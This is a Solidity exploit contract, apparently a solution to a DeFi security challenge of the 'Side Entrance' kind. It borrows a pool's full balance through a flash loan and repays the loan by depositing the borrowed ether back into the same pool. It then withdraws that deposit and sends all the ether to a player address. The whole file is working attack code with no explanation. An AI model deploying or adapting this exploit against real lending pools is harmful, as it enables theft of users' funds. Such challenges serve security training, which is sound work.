// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

contract AttackSE {
    address player;
    address pool;
    bytes encodedParams;

    constructor (address _player,address _pool) {
        player = _player;
        pool = _pool;
    }

    function kek() public {
        encodedParams = abi.encodeWithSelector(bytes4(keccak256("flashLoan(uint256)")),pool.balance);        
        (bool success,) = pool.call(encodedParams);        
    }

    function execute() public payable {
        encodedParams = abi.encodeWithSelector(bytes4(keccak256("deposit()")));        
        (bool success,) = pool.call{value: msg.value}(encodedParams);
    }

    function withdraw() public {
        encodedParams = abi.encodeWithSelector(bytes4(keccak256("withdraw()")));        
        (bool success,) = pool.call(encodedParams); 
        SafeTransferLib.safeTransferETH(player, address(this).balance);
    } 

    receive() external payable {}
}